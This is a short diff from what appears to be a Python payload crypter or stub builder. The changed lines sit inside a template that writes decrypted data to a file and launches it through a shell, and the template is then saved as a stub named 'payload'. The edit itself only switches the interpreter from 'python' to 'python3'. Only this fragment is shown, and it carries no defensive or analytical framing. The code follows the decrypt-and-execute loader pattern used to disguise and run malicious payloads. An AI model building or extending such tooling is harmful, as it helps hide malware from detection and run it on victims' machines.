@@ -28,7 +28,7 @@ new_file.write(decrypt_data)
 new_file.close()
 # Execute file
 import subprocess
-proc = subprocess.Popen("python "+new_file_name, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+proc = subprocess.Popen("python3 "+new_file_name, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 """
 # Save the Stub
 stub_name = "payload"
